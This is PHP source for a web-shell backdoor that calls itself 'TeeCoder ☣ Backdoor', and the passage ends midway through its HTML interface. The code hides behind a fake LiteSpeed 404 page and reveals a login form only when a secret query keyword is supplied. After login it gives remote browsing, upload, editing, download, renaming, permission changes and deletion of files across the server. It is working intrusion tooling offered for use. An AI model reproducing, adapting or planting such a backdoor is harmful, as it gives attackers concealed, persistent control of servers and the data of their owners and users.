<?php

declare(strict_types=1);

$config = [

    'credentials' => [
        'username' => 'username',
        'password' => password_hash('password', PASSWORD_DEFAULT)
    ],

    'format_size' => [
        'gb' => 1073741824,
        'mb' => 1048576,
        'kb' => 1024
    ],

    'keywords' => [
        'login' => 'secret'
    ]
];

class App
{
    public function __construct(
        public Config $config,
        public File $file,
        public Request $request,
        public Response $response,
        public Server $server,
        public Session $session
    ) {
        $this->session->start();
    }

    public function authenticate(): never
    {
        $credentials = $this->validate([
            'username' => $this->request->post('username'),
            'password' => $this->request->post('password')
        ]);

        if (!$this->attempt($credentials)) {
            $this->session->flash('message', 'The provided credentials do not match our records.');
            $this->response->redirect($this->server->php_self . "?login={$this->config->get('keywords', 'login')}");
            exit;
        }

        $this->session->regenerateId();
        $this->session->setCredentials('username', $credentials['username']);
        $this->response->redirect($this->server->php_self);
        exit;
    }

    public function logout(): void
    {
        $this->session->destroy();
        $this->response->redirect($this->server->php_self);
        exit;
    }

    private function validate(array $credentials): array
    {
        if ($credentials['username'] === '') {
            $this->session->setErrors('username', 'Username field is required.');
        }

        if ($credentials['password'] === '') {
            $this->session->setErrors('password', 'Password field is required.');
        }

        if ($credentials['username'] === '' || $credentials['password'] === '') {
            $this->response->redirect($this->server->php_self . "?login={$this->config->get('keywords', 'login')}");
            exit;
        }

        return $credentials;
    }

    private function attempt(array $credentials): bool
    {
        if (
            $credentials['username'] !== $this->config->get('credentials', 'username')
            || !password_verify($credentials['password'], $this->config->get('credentials', 'password'))
        ) {
            return false;
        }

        return true;
    }
}

class Config
{
    public function get(string $type, string $key): mixed
    {
        global $config;

        return $config[$type][$key];
    }
}

class File
{
    public const TYPE_FILE = 1;
    public const TYPE_DIRECTORY = 2;

    private Request $request;
    private Response $response;
    private Server $server;
    private Session $session;
    private array $path;
    private array $files;
    private array $formatSizeOptions;

    /** @var string $cwd Current working directory */
    public string $cwd;

    public function __construct()
    {
        $this->request           = new Request();
        $this->response          = new Response();
        $this->server            = new Server();
        $this->session           = new Session();
        $this->path              = [];
        $this->files             = [];
        $this->cwd               = $this->request->has('get', 'path') ? $this->request->get('path') : getcwd();
        $this->formatSizeOptions = [
            'GB' => 1073741824,
            'MB' => 1048576,
            'KB' => 1024
        ];

        chdir($this->cwd . '/');
    }

    public function run(): void
    {
        $this->setPath();
        $this->setFiles();
    }

    public function setPath(): void
    {
        $this->path = explode('/', str_replace('\\', '/', $this->cwd));

        if ($this->path[0] === '') {
            $this->path[0] = '/';
        }
    }

    public function getPath(): array
    {
        return $this->path;
    }

    public function setFiles(): void
    {
        $directories = [];
        $files       = [];
        $list        = scandir($this->cwd . '/');

        foreach ($list as $filename) {
            if ($filename === '.' || $filename === '..') continue;

            if (is_dir($filename))  $directories[] = $filename;
            if (is_file($filename)) $files[]       = $filename;
        }

        sort($directories, SORT_STRING);
        sort($files, SORT_STRING);

        $this->files = array_merge($directories, $files);
    }

    public function getFiles(): array
    {

        return $this->files;
    }

    public function formatSize(int $bytes): string
    {
        if ($bytes >= $this->formatSizeOptions['GB']) return number_format($bytes / $this->formatSizeOptions['GB'], 2) . ' GB';
        if ($bytes >= $this->formatSizeOptions['MB']) return number_format($bytes / $this->formatSizeOptions['MB'], 2) . ' MB';
        if ($bytes >= $this->formatSizeOptions['KB']) return number_format($bytes / $this->formatSizeOptions['KB'], 2) . ' KB';
        if ($bytes > 0) return $bytes . ' B';

        return '0 B';
    }

    public function formatPermissions(int $perms): string
    {
        if (($perms & 0xF000) === 0xC000)     $info = 's'; // Socket
        elseif (($perms & 0xF000) === 0xA000) $info = 'l'; // Symbolic Link
        elseif (($perms & 0xF000) === 0x8000) $info = '-'; // Regular
        elseif (($perms & 0xF000) === 0x6000) $info = 'b'; // Block Special
        elseif (($perms & 0xF000) === 0x4000) $info = 'd'; // Directory
        elseif (($perms & 0xF000) === 0x2000) $info = 'c'; // Character Special
        elseif (($perms & 0xF000) === 0x1000) $info = 'p'; // FIFO Pipe
        else                                  $info = 'u'; // Unknown

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

        return $info;
    }

    public function permissionColor(string $file): string
    {
        return is_readable($file) ? 'text-lime' : 'text-red';
    }

    public function upload(array $fileData): void
    {
        [
            'name'      => $name,
            'tmp_name'  => $tmpName
        ] = $fileData;

        if (!move_uploaded_file($tmpName, $this->cwd . '/' . $name)) {
            $this->session->flash('message', 'Failed to upload file.');
            $code = 302;
        } else {
            $this->session->flash('message', 'File uploaded successfully.');
            $code = 201;
        }

        $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', $code);
    }

    public function make(int $type): void
    {
        if ($type === self::TYPE_FILE) {
            [$filename, $content, $force] = $this->validate(self::TYPE_FILE);
            $this->makeFile($filename, $content, $force);
        }

        if ($type === self::TYPE_DIRECTORY) {
            [$directoryName, $force] = $this->validate(self::TYPE_DIRECTORY);
            $this->makeDirectory($directoryName, $force);
        }
    }

    private function makeFile(string $filename, string $content, bool $force): void
    {
        if (file_exists($this->cwd . '/' . $filename) && !$force) {
            $this->session->flash('message', 'File is already exists in ' . $this->cwd . '/' . $filename);
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
            exit;
        }

        file_put_contents($this->cwd . '/' . $filename, $content);
        $this->session->flash('message', 'File created successfully');
        $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 201);
    }

    private function makeDirectory(string $directoryName, bool $force): void
    {
        if (file_exists($this->cwd . '/' . $directoryName) && !$force) {
            $this->session->flash('message', 'Directory is already exists in ' . $this->cwd . '/' . $directoryName);
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
            exit;
        }

        mkdir($this->cwd . '/' . $directoryName, 0775, true);
        $this->session->flash('message', 'Directory created successfully');
        $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 201);
    }

    private function validate(int $type): array|string
    {
        if ($type === self::TYPE_FILE) {
            if ($this->request->post('newFile') === '') {
                $this->session->setErrors('newFile', 'File name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            return [
                $this->request->post('newFile'),
                $this->request->post('newFileContent'),
                (bool) $this->request->post('newFileForceCreate')
            ];
        }

        if ($type === self::TYPE_DIRECTORY) {
            if ($this->request->post('newDirectory') === '') {
                $this->session->setErrors('newDirectory', 'Directory name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            return [
                $this->request->post('newDirectory'),
                (bool) $this->request->post('newDirectoryForceCreate')
            ];
        }
    }

    public function download(string $file): never
    {
        if (!file_exists($this->cwd . '/' . $file)) {
            $this->session->flash('message', 'File ' . $file . ' is not found in ' . $this->cwd . '/');
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
            exit;
        }

        $this->request->setHeader([
            'Content-Description' => 'File Transfer',
            'Content-Type'        => 'application/octet-stream',
            'Content-Disposition' => 'attachment; filename="' . basename($file) . '"',
            'Expires'             => 0,
            'Cache-Control'       => 'must-revalidate',
            'Pragma'              => 'public',
            'Content-Length'      => filesize($file)
        ]);

        readfile($file);
        exit;
    }

    public function edit(string $filename, string $fileContent): void
    {
        if (!file_exists($this->cwd . '/' . $filename)) {
            $this->session->flash('message', 'File ' . $filename . ' is not found in ' . $this->cwd . '/');
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
            exit;
        }

        file_put_contents($filename, $fileContent);
        $this->session->flash('message', 'File updated successfully!');
        $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 200);
    }

    public function rename(int $type): void
    {
        if ($type === self::TYPE_FILE) {
            $oldFileName = $this->request->post('oldFileName');
            $newFileName = $this->request->post('newFileName');

            if ($oldFileName === '') {
                $this->session->setErrors('oldFileName', 'Old file name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if ($newFileName === '') {
                $this->session->setErrors('newFileName', 'New file name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if (!file_exists($oldFileName)) {
                $this->session->flash('message', $oldFileName . ' is not found in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if (file_exists($this->cwd . '/' . $newFileName) && $newFileName !== $oldFileName) {
                $this->session->flash('message', 'File ' . $newFileName . ' is already exists in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            rename($oldFileName, $newFileName);
            $this->session->flash('message', 'File renamed successfully! ' . $oldFileName . ' => ' . $newFileName);
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 200);
        }

        if ($type === self::TYPE_DIRECTORY) {
            $oldDirectoryName = $this->request->post('oldDirectoryName');
            $newDirectoryName = $this->request->post('newDirectoryName');

            if ($oldDirectoryName === '') {
                $this->session->setErrors('oldDirectoryName', 'Old directory name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if ($newDirectoryName === '') {
                $this->session->setErrors('newDirectoryName', 'New directory name field is required.');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if (!file_exists($oldDirectoryName)) {
                $this->session->flash('message', $oldDirectoryName . ' is not found in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if (file_exists($this->cwd . '/' . $newDirectoryName) && $newDirectoryName !== $oldDirectoryName) {
                $this->session->flash('message', 'Directory ' . $newDirectoryName . ' is already exists in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            rename($oldDirectoryName, $newDirectoryName);
            $this->session->flash('message', 'Directory renamed successfully! ' . $oldDirectoryName . ' => ' . $newDirectoryName);
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 200);
        }
    }

    public function changePermission(string $filename, string $permission): void
    {
        if (strlen($permission) > 4 || preg_match("/[A-z]|[\'^£$%&*()}{@#~?><>,|=_+¬-]/", $permission)) {
            $this->session->flash('message', 'Invalid permission');
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
            exit;
        }

        chmod($this->cwd . '/' . $filename, octdec($permission));
        $this->session->flash('message', 'Permission changed successfully!');
        $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 200);
    }

    public function delete(int $type, string $filename): void
    {
        if ($type === self::TYPE_FILE) {
            if (!file_exists($filename)) {
                $this->session->flash('message', $filename . ' is not found in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            unlink($filename);
            $this->session->flash('message', 'File deleted successfully');
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 204);
        }

        if ($type === self::TYPE_DIRECTORY) {
            if (!file_exists($filename)) {
                $this->session->flash('message', $filename . ' is not found in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            if (!rmdir($filename)) {
                $this->session->flash('message', $filename . ' is not empty in ' . $this->cwd . '/');
                $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/');
                exit;
            }

            rmdir($filename);
            $this->session->flash('message', 'Directory deleted successfully');
            $this->response->redirect($this->server->php_self . '?path=' . $this->cwd . '/', 204);
        }
    }
}

class Request
{
    public function setHeader(array $headers)
    {
        foreach ($headers as $key => $value) {
            header($key . ': ' . $value);
        }
    }

    public function has(string $requestMethod, string $key): bool
    {
        if ($requestMethod === 'get') return isset($_GET[$key]);
        if ($requestMethod === 'post') return isset($_POST[$key]);
    }

    public function get(string $key): mixed
    {
        return $_GET[$key] ?? null;
    }

    public function post(string $key): mixed
    {
        return $_POST[$key] ?? null;
    }

    public function files(?string $key = null): mixed
    {
        if ($key === null) return $_FILES;
        if (!isset($_FILES[$key])) return false;

        return $_FILES[$key];
    }
}

class Response
{
    public function redirect(string $to, int $code = 302): void
    {
        header('Location: ' . $to, true, $code);
    }

    public function setCode(int $code): void
    {
        http_response_code($code);
    }
}

class Server
{
    public function __get($key): mixed
    {
        return $_SERVER[strtoupper($key)];
    }
}

class Session
{
    public const FLASH       = 'flash';
    public const CREDENTIALS = 'credentials';
    public const ERRORS      = 'errors';

    public function start(): void
    {
        session_start();
    }

    public function regenerateId(): void
    {
        session_regenerate_id();
    }

    public function destroy(): void
    {
        session_unset();
        session_destroy();
    }

    public function has(string $type, string $key): bool
    {
        return isset($_SESSION[$type][$key]);
    }

    public function flash(string $key, mixed $value): void
    {
        if (isset($_SESSION[self::FLASH])) {
            $this->unset(self::FLASH);
        }

        $_SESSION[self::FLASH][$key] = $value;
    }

    public function printFlash(string $key): mixed
    {
        return $_SESSION[self::FLASH][$key];
    }

    public function setErrors(string $key, mixed $value): void
    {
        $_SESSION[self::ERRORS][$key] = $value;
    }

    public function getErrors(string $key): mixed
    {
        return $_SESSION[self::ERRORS][$key];
    }

    public function setCredentials(string $key, mixed $value): void
    {
        $_SESSION[self::CREDENTIALS][$key] = $value;
    }

    public function getCredentials(string $key): mixed
    {
        return $_SESSION[self::CREDENTIALS][$key];
    }

    public function unset(string $type, ?string $key = null): void
    {
        if (!$key) {
            unset($_SESSION[$type]);
            return;
        }

        unset($_SESSION[$type][$key]);
    }
}

$app = new App(new Config(), new File(), new Request(), new Response(), new Server(), new Session());

/*
|-------------------------------------------------------------------
| 404 not found.
|-------------------------------------------------------------------
|
| First, we render 404 page with 404 http response code to pretend
| like this backdoor does not exists in the server.
|
*/

if (
    !$app->session->has($app->session::CREDENTIALS, 'username')
    && !$app->request->has('get', 'login')
    || ($app->request->has('get', 'login')
        && $app->request->get('login')
        !== $app->config->get('keywords', 'login'))
) :
    $app->response->setCode(404);
?>

    <!DOCTYPE html>
    <html style="height:100%">

    <head>
        <title>404 Not Found</title>
    </head>

    <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
        <div style="height:auto; min-height:100%; ">
            <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                <h2 style="margin-top:20px;font-size: 30px;">Not Found
                </h2>
                <p>The resource requested could not be found on this server!</p>
            </div>
        </div>
        <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
            <br>Proudly powered by <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a>
            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
        </div>
    </body>

    </html>

<?php endif;

/*
|-------------------------------------------------------------------
| Login page.
|-------------------------------------------------------------------
|
| This login page only shown if the query string contains certain
| keywords.
|
*/

if ($app->request->has('post', 'username') && $app->request->has('post', 'password')) {
    $app->authenticate();
}

if (
    $app->request->has('get', 'login')
    && $app->request->get('login')
    === $app->config->get('keywords', 'login')
    && !$app->session->has($app->session::CREDENTIALS, 'username')
) :

?>

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TeeCoder ☣ Backdoor</title>

        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
        <style>
            .bg-light {
                background-color: #f2f4f6 !important;
            }

            .text-lime {
                color: #84cc16;
            }

            .text-red {
                color: #b91c1c;
            }

            .resize-none {
                resize: none;
            }

            .min-h-screen {
                min-height: 100vh;
            }
        </style>
    </head>

    <body class="bg-light min-h-screen d-flex justify-content-center align-items-center">

        <div class="container">
            <div class="row">
                <div class="col-12 col-md-10 col-lg-8 col-xl-6 mx-auto">
                    <div class="card border-0 shadow-sm">
                        <div class="card-body">
                            <h4 class="text-center">Login</h4>
                            <?php if ($app->session->has($app->session::FLASH, 'message')) : ?>
                                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                                    <?php
                                    echo $app->session->printFlash('message');
                                    ?>
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                </div>
                            <?php endif; ?>
                            <form action="<?= htmlspecialchars($app->server->php_self); ?>" method="POST">
                                <div class="mb-3">
                                    <label class="form-label" for="username">Username</label>
                                    <input class="form-control <?= $app->session->has($app->session::ERRORS, 'username') ? 'is-invalid' : '' ?>" type="text" name="username" id="username" autofocus>
                                    <?php if ($app->session->has($app->session::ERRORS, 'username')) : ?>
                                        <small class="text-danger d-inline-block mt-1">
                                            <?= $app->session->getErrors('username'); ?>
                                        </small>
                                    <?php endif; ?>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="password">Password</label>
                                    <input class="form-control <?= $app->session->has($app->session::ERRORS, 'password') ? 'is-invalid' : '' ?>" type="password" name="password" id="password">
                                    <?php if ($app->session->has($app->session::ERRORS, 'password')) : ?>
                                        <small class="text-danger d-inline-block mt-1">
                                            <?= $app->session->getErrors('password'); ?>
                                        </small>
                                    <?php endif; ?>
                                </div>
                                <div>
                                    <button class="btn btn-dark d-block ms-auto">Login</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
    </body>

    </html>

<?php endif;

/*
|-------------------------------------------------------------------
| Backdoor page.
|-------------------------------------------------------------------
|
| This is the main backdoor page that you can use to organize your
| files and folders.
|
*/

if ($app->request->files('fileUpload')) {
    $app->file->upload($app->request->files('fileUpload'));
}

if ($app->request->has('post', 'createBtn')) {
    $app->file->make((int) $app->request->post('createBtn'));
}

if ($app->request->has('get', 'download')) {
    $app->file->download($app->request->get('download'));
}

if ($app->request->has('post', 'updateBtn')) {
    $app->file->edit($app->request->post('filename'), $app->request->post('fileContent'));
}

if ($app->request->has('post', 'renameBtn')) {
    $app->file->rename((int) $app->request->post('renameBtn'));
}

if ($app->request->has('post', 'changePermissionBtn')) {
    $app->file->changePermission(
        $app->request->post('filename'),
        $app->request->post('newPermission')
    );
}

if ($app->request->has('post', 'deleteBtn')) {
    $app->file->delete((int) $app->request->post('deleteBtn'), $app->request->post('delete'));
}

if ($app->session->has($app->session::CREDENTIALS, 'username')) :
    $app->response->setCode(200);
    $app->file->run();

    $paths = $app->file->getPath();
    $files = $app->file->getFiles();

    if ($app->request->has('post', 'logout')) {
        $app->logout();
    }
?>

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TeeCoder ☣ Backdoor</title>

        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
        <script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>

        <style>
            .bg-light {
                background-color: #f2f4f6 !important;
            }

            .text-lime {
                color: #84cc16;
            }

            .text-red {
                color: #b91c1c;
            }

            .resize-none {
                resize: none;
            }

            .min-h-screen {
                min-height: 100vh;
            }

            .cursor-pointer {
                cursor: pointer;
            }
        </style>
    </head>

    <body class="bg-light">
        <div class="container">
            <h1 class="text-center mt-4">TeeCoder ☣ Backdoor</h1>
            <div class="my-3 d-flex flex-wrap justify-content-between align-items-center">
                <div class="d-flex flex-wrap gap-3">
                    <button class="btn btn-dark fw-bold" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="New file" data-bs-toggle="modal" data-bs-target="#createNewFileModal">
                        <i class="fas fa-file-circle-plus"></i>
                    </button>
                    <button class="btn btn-dark fw-bold" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="New directory" data-bs-toggle="modal" data-bs-target="#createNewDirectoryModal">
                        <i class="fas fa-folder-plus"></i>
                    </button>
                </div>
                <form action="<?= htmlspecialchars($app->server->php_self); ?>" method="POST">
                    <button class="btn btn-dark fw-bold" name="logout" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Logout">
                        <div class="fas fa-right-from-bracket"></div>
                    </button>
                </form>
            </div>
            <div class="row mb-3">
                <div class="col-12">
                    <div class="card border-0 shadow-sm">
                        <div class="card-body">
                            <span class="fw-bold me-1">Path:</span>
                            <?php foreach ($paths as $path) : ?>
                                <span class="text-primary">
                                    <a class="text-decoration-none text-primary" href="
                                    <?php
                                    echo htmlspecialchars($app->server->php_self) . '?path=';

                                    foreach ($paths as $p) {

                                        if ($p !== $path) {
                                            echo trim(htmlspecialchars($p), '/') . '/';
                                        }

                                        if ($p === $path) {
                                            echo trim(htmlspecialchars($p), '/');
                                            break;
                                        }
                                    }
                                    ?>
                                    ">
                                        <?= htmlspecialchars($path); ?>
                                    </a>
                                    <?php if ($path !== reset($paths)) : ?>
                                        /
                                    <?php endif; ?>
                                </span>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row mb-3">
                <div class="col-12">
                    <div class="card border-0 shadow-sm">
                        <div class="card-body">
                            <?php if ($app->session->has($app->session::FLASH, 'message')) : ?>
                                <div class="alert alert-info alert-dismissible fade show" role="alert">
                                    <?php
                                    echo $app->session->printFlash('message');
                                    ?>
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                </div>
                            <?php endif; ?>
                            <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . htmlspecialchars($app->file->cwd); ?>" method="POST" enctype="multipart/form-data">
                                <div class="input-group">
                                    <input type="file" class="form-control" name="fileUpload" id="fileUpload" aria-describedby="uploadBtn" aria-label="Upload">
                                    <button class="btn btn-outline-dark" id="uploadBtn" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Upload">
                                        <i class="fas fa-upload"></i>
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-12">
                    <div class="card border-0 shadow-sm">
                        <div class="card-body">
                            <?php if (!empty($files)) : ?>
                                <div class="table-responsive">
                                    <table class="table table-hover align-middle">
                                        <thead>
                                            <tr>
                                                <th class="fw-bold">Files</th>
                                                <th class="fw-bold">Size</th>
                                                <th class="fw-bold">Permissions</th>
                                                <th class="fw-bold">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($files as $file) : ?>
                                                <tr>
                                                    <td>
                                                        <i class="fas fa-fw fa-<?= is_dir($file) ? 'folder text-warning' : 'file text-secondary'; ?> me-2"></i>
                                                        <?php if (is_dir($file)) : ?>
                                                            <a class="text-decoration-none text-black" href="<?= htmlspecialchars($app->server->php_self) . '?path=' . htmlspecialchars($app->file->cwd) . '/' . htmlspecialchars($file); ?>">
                                                                <?= $file; ?>
                                                            </a>
                                                        <?php else : ?>
                                                            <a class="text-decoration-none text-black cursor-pointer" <?= is_readable($file) ? 'data-bs-toggle="modal" data-bs-target="#editFileModal" data-filename="' . $file . '" data-file-content="' . htmlspecialchars(file_get_contents($file)) . '" onclick="passDataToEditFileModal(this)"' : ''; ?>>
                                                                <?= $file; ?>
                                                            </a>
                                                        <?php endif; ?>
                                                    </td>
                                                    <td>
                                                        <?= $app->file->formatSize(filesize($file)); ?>
                                                    </td>
                                                    <td class="<?= $app->file->permissionColor($file) ?>">
                                                        <?= $app->file->formatPermissions(fileperms($file)) ?>
                                                    </td>
                                                    <td>
                                                        <div class="d-flex gap-2 justify-content-end">
                                                            <?php if (is_dir($file)) : ?>
                                                                <?php if (is_readable($file)) : ?>
                                                                    <button class="btn btn-warning btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Rename directory" data-bs-toggle="modal" data-bs-target="#renameDirectoryModal" data-old-directory-name="<?= $file; ?>" onclick="passDataToRenameDirectoryModal(this)">
                                                                        <i class="fas fa-pen"></i>
                                                                    </button>
                                                                    <button class="btn btn-secondary btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Change permission" data-bs-toggle="modal" data-bs-target="#changePermissionModal" data-filename="<?= $file; ?>" data-permission="<?= substr(sprintf('%o', fileperms($file)), -4); ?>" onclick="passDataToChangePermissionModal(this)">
                                                                        <i class="fas fa-lock"></i>
                                                                    </button>
                                                                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                                                                        <input type="hidden" name="delete" value="<?= $file; ?>">
                                                                        <button class="btn btn-danger btn-sm" name="deleteBtn" value="<?= $app->file::TYPE_DIRECTORY; ?>" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Delete directory" onclick="return confirm('Delete <?= $file; ?> directory?')">
                                                                            <i class="fas fa-trash"></i>
                                                                        </button>
                                                                    </form>
                                                                <?php endif; ?>
                                                            <?php else : ?>
                                                                <a href="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/') . '&download=' . $file; ?>" class="btn btn-primary btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Download file">
                                                                    <i class="fas fa-download"></i>
                                                                </a>
                                                                <?php if (is_readable($file)) : ?>
                                                                    <button class="btn btn-info btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Edit file" data-bs-toggle="modal" data-bs-target="#editFileModal" data-filename="<?= $file; ?>" data-file-content="<?= htmlspecialchars(file_get_contents($file)); ?>" onclick="passDataToEditFileModal(this)">
                                                                        <i class="fas fa-file-pen"></i>
                                                                    </button>
                                                                    <button class="btn btn-warning btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Rename file" data-bs-toggle="modal" data-bs-target="#renameFileModal" data-old-file-name="<?= $file; ?>" onclick="passDataToRenameFileModal(this)">
                                                                        <i class="fas fa-pen"></i>
                                                                    </button>
                                                                    <button class="btn btn-secondary btn-sm" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Change permission" data-bs-toggle="modal" data-bs-target="#changePermissionModal" data-filename="<?= $file; ?>" data-permission="<?= substr(sprintf('%o', fileperms($file)), -4); ?>" onclick="passDataToChangePermissionModal(this)">
                                                                        <i class="fas fa-lock"></i>
                                                                    </button>
                                                                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                                                                        <input type="hidden" name="delete" value="<?= $file; ?>">
                                                                        <button class="btn btn-danger btn-sm" name="deleteBtn" value="<?= $app->file::TYPE_FILE; ?>" data-bs-tooltip="tooltip" data-bs-placement="top" data-bs-title="Delete file" onclick="return confirm('Delete <?= $file; ?> file?')">
                                                                            <i class="fas fa-trash"></i>
                                                                        </button>
                                                                    </form>
                                                                <?php endif; ?>
                                                            <?php endif; ?>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            <?php else : ?>
                                <div class="alert alert-info m-0 d-flex justify-content-between align-items-center" role="alert">
                                    <span>This directory is empty.</span>
                                    <div class="fas fa-info-circle"></div>
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- createNewFileModal -->
        <div class="modal fade" id="createNewFileModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="createNewFileModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered modal-lg">
                <div class="modal-content">
                    <form action="<?= htmlspecialchars($app->server->php_self) . '?path=' . rtrim(htmlspecialchars($app->file->cwd), '/'); ?>" method="POST">
                        <div class="modal-header">
                            <h5 class="modal-title" id="createNewFileModalLabel">Create a new file</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="mb-3">
                                <label class="form-label" for="newFile">File Name</label>
                                <input class="form-control <?= $app->session->has($app->session::ERRORS, 'newFile') ? 'is-invalid' : '' ?>" type="text" name="newFile" id="newFile">
                                <?php if ($app->session->has($app->session::ERRORS, 'newFile')) : ?>
                                    <small class="text-danger d-inline-block mt-1">
                                        <?= $app->session->getErrors('newFile'); ?>
                                    </small>
                                <?php endif; ?>
                            </div>
                            <div class="mb-3">
                                <label class="form-label" for="newFileContent">File Content <small class="text-muted">(Optional)</small></label>
